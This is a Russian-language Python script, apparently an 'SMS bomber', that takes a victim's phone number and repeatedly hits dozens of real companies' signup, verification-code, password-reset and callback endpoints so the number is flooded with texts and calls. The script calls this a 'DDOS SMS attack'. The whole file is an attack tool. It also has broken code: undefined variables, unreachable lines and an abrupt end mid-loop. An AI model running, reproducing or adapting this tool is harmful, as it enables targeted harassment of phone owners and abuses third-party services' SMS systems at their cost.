
#   Version 10.1
import requests, random, datetime, sys, time, argparse, os , colorama ,pickle
from colorama import Fore, Back, Style
from colorama import init
from Banners import start
from Banners import banner3
from Banners import banner4
from Banners import banner1an
from Banners import banner2an
from Banners import kol2
oso = os.name
init()




#Баннер старта 
os.system("clear")
start()
input()


#Баннер cПАМЕРА
os.system("clear")

if oso == "posix":
    banner1an()
else:
    banner2an()


if oso == "posix":
    banner3()
else:
    banner4()


message1 = "\n Изменения применены!"
message8 = """    \n Разработчики:  
                  \n                                      
                  \n Создатель идеи/Разработчик:
                  \n \033[94mИван Зайцев\033[0m - https://vk.com/ivan_vzlom300 
                  \n                                      
                  \n \033[33mСоздатель эффектов/анимации:\033[0m 
                  \n \033[94mДима Чернышов\033[0m - https://vk.com/psih.odinochka  
                  \n                                     
                  \n \033[33mДистрибьютор/фиксер:\033[0m 
                  \n \033[94mddan9\033[0m - https://github.com/ddan9 
                  \n    
                                  
                                                                      """


print(Fore.GREEN)
time.sleep(1)
E = input("\n Хотите попасть в настройки? (1 - Да | \033[31m2 - Нет\033[0m\033[32m) > \033[94m")
if E == str(1):
    print(Fore.GREEN)
    print("\n          [НАСТРОЙКИ] ")
    print("\n \033[94m[0] Разработчики \033[0m                             ")
    print("\n \033[32m[1] Время показа баннера (Сек)\033[0m  ")
    print("\n \033[32m[2] Выход\033[0m ")
    time.sleep(2)
    print(Fore.GREEN)
    p = input("\n [>] ")
    
    if p == str(1):
        kol2 =  input("\n Введите время не более 20! > ")
        for char in message1:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.01)
        p = input("\n Чтобы выйти введите (2) > ")

    if p == str(0):
        print(Fore.YELLOW)
        for char in message8:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.01)
        print(Fore.GREEN)
        p = input("\n Чтобы выйти введите (2) > ")

    if p == str(2):
        os.system("clear")
        if oso == "posix":
            banner3()
        else:
            banner4()

if E == str(2):
    os.system("clear")
    if oso == "posix":
        banner3()
    else:
        banner4()


def banner_atack2():
  print(Fore.GREEN)
  baner = """
			┏━━━┓┏┓     ┏┓
			┃┏━┓┣┛┗┓   ┏┛┗┓
			┃┗━━╋┓┏╋━━┳┻┓┏┛
			┗━━┓┃┃┃┃┏┓┃┏┫┃
			┃┗━┛┃┃┗┫┏┓┃┃┃┗┓
			┗━━━┛┗━┻┛┗┻┛┗━┛...
"""
  print(baner)
  print (" \033[31m[                    ]\033[33m \033[94m5%\033[0m")
  time.sleep(0.1)
  print (" \033[31m[=====               ]\033[33m \033[94m35%\033[0m")
  time.sleep(1)
  print (" \033[31m[==========          ]\033[33m \033[94m52%\033[0m")
  time.sleep(1)
  print (" \033[31m[====================]\033[33m \033[94m100%\033[0m")
  time.sleep(2)
  print(Fore.RED)

  for char in message4:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.01)





def banner_atack():
  print(Fore.YELLOW)
  print("""        _       _             _      ____  _             _   _             
       / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
      / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
     / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
    /_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                     |___/ ......""")
  print ("  \033[31m[                    ]\033[33m \033[94m5%\033[0m")
  time.sleep(0.1)
  print ("  \033[31m[=====               ]\033[33m \033[94m35%\033[0m")
  time.sleep(1)
  print ("  \033[31m[==========          ]\033[33m \033[94m52%\033[0m")
  time.sleep(1)
  print ("  \033[31m[====================]\033[33m \033[94m100%\033[0m")
  time.sleep(2)
  print(Fore.RED)
  for char in message4:
    sys.stdout.write(char)
    sys.stdout.flush()
    time.sleep(0.01)


R = 0
message7 = "\033[94m \n Чтобы выйти из программы, нажмите Ctrl + C\033[0m"
message5 = "\033[94m \n ЧТо бы вЫйти из прОграМмы нАжмиТе Ctrl + C иЛи на КРЕСТИК в пРавоМ верХнем угЛу. \033[0m"
if oso == "posix":
    for char in message7:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)

else:
    for char in message5:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)

print(Fore.RED)
_phone = input('\n \033[31mВведите номер (Без +) > \033[0m\033[94m')
message4 =  "Начинаем атаку на || " + str(_phone)+ " || \033[94mDDOS SMS Атака \n\nЕсли застряло, нажмите Ctrl+C \033[0m \n"

if _phone[0] == '+':

    _phone = _phone[1:]

if _phone[0] == '8':

    _phone = '7'+_phone[1:]

if _phone[0] == '9':

    _phone = '7'+_phone

kol = input("\n \033[31mВремя атаки (Сек) (Введите больше 30 | 0 - бесконечно) > \033[0m\033[94m ")
if kol == str(0):
    kol = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
start_time = time.time() 
CLOSE_AFTER = kol
call = input("\n \033[31mTип атаки (1 - Атака звонками (НЕ РАБОТАЕТ) | 2 - SMS Атака) > \033[0m\033[94m")
if call == str(1):
    os.system("clear")

    if oso == "posix":
        banner_atack2()
    else:
        banner_atack()
    
    while True:      	
      if time.time() > start_time + float(CLOSE_AFTER): 
        print(Fore.RED)
        print("Атака закончена! Нажмите на ENTER для закрытия программы...")
        break
      try:
        requests.post('https://my.zadarma.com/connect/', params={"?number=": '+' + _phone})
        print(Fore.GREEN)
        print('[+] zadarma звонок отправлен!')
      except:
        print(Fore.RED)
        print('[-] Не удалось отправить запрос на звонок! (zadarma) ')

      if time.time() > start_time + float(CLOSE_AFTER):
        print(Fore.RED)
        print("Атака закончена! Нажмите на ENTER для закрытия программы...")
        break
      try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        print(Fore.GREEN)

        print('[+] findclone звонок отправлен!')
      except:
        print(Fore.RED)
        print('[-] Не удалось отправить запрос на звонок! (findclone)')

      if time.time() > start_time + float(CLOSE_AFTER):
        print(Fore.RED)
        print("Атака закончена! Нажмите на ENTER для закрытия программы...")
        break

      try:
        requests.post('https://msk.dostaevsky.ru/ajax/feedback/', params={"back_call": '+' + _phone})
        print(Fore.GREEN)
        print('[+] dostaevsky звонок отправлен!')
      except:
        print(Fore.RED)
        print('[-] Не удалось отправить запрос на звонок! (dostaevsky)')
      time.sleep(0.8)




if call == str(2):
    start_time = time.time() 
    CLOSE_AFTER = kol
    os.system("clear") 
    if oso == "posix":
        banner_atack2()
    else:
        banner_atack()
    print(Fore.GREEN)

    while True:
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            time.sleep(1)
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            R = R + 1
            print('[+] RuTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            R = R + 1
            print('[+] BelkaCar Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php',
                          data={'aj': '50', 'registration-phone': _phone})
            R = R + 1
            print('[+] StarPizzaCafe Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            R = R + 1
            print('[+] Dostavista Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:

            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] MonoBank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
            R = R + 1
            print('[+] binotel Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                         data={"phone": _phone})
            R = R + 1
            print('[+] SportMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            R = R + 1
            print('[+] Alfalife Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            R = R + 1
            print('[+] KoronaPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone',
                          data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                                "oferta": "on", })
            R = R + 1
            print('[+] GGbet Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.etm.ru/cat/runprog.html',
                          data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                                "getSysParam": "yes", })
            R = R + 1
            print('[+] ETM Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
            R = R + 1
            print('[+] TheLive Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            R = R + 1
            print('[+] MyGames Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/',
                          json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                                "birthdate": "11.11.1999", "phone": (_phone, "+* (***) ***-**-**"), "email": _email,
                                "city": "Москва", })
            R = R + 1
            print('[+] Zoloto585 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
            R = R + 1
            print('[+] Kasta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                          data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            R = R + 1
            print('[+] Тaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send',
                          json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
            R = R + 1
            print('[+] Creditter Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                          headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                          json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                                "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999),
                                "DocSeries": randint(5000, 9999), "FirstName": _name, "Gender": "M", "LastName": _name,
                                "SecondName": _name, "Phone": _phone, "Email": _email, })
            R = R + 1
            print('[+] Ingos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                          json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                                "email": "", "lang": "en", })
            R = R + 1
            print('[+] Admiralxxx Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            R = R + 1
            print('[+] Av Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            R = R + 1
            print('[+] City24 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            R = R + 1
            print('[+] SushiMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            R = R + 1
            print('[+] MultiPlex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
            R = R + 1
            print('[+] 3040 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                          data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
            R = R + 1
            print('[+] Niyama Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            R = R + 1
            print('[+] VSK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            R = R + 1
            print('[+] EasyPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            R = R + 1
            print('[+] Fix-Price Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            R = R + 1
            print('[+] Tele2 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] Finam Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://makimaki.ru/system/callback.php',
                          params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
            R = R + 1
            print('[+] MakiMaki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status',
                          headers={"Origin": "https://www.flipkart.com",
                                   "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                          json={"loginId": "+" + _phone, "supportAllStates": True})
            R = R + 1
            print('[+] FlipKart Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            R = R + 1
            print('[+] Online.ua Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            R = R + 1
            print('[+] PlanetaKino Was sent!')
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client',
                          json={"country": _codes[_code].upper(), "phone": _phone, })
            R = R + 1
            print('[+] OnTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Iqos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/',
                          json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            R = R + 1
            print('[+] Smart.Space Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                          data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                                'phone': _phone})
            R = R + 1
            print('[+] tarantino-family Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://apteka.ru/_action/auth/getForm/',
                          data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                                "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                                "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                                "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                                "utc_offset": "120", })
            R = R + 1
            print('[+] Apteka Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            R = R + 1
            print('[+] Uklon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                          json={"phone": _phone, "otpId": 0})
            R = R + 1
            print('[+] Ozon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
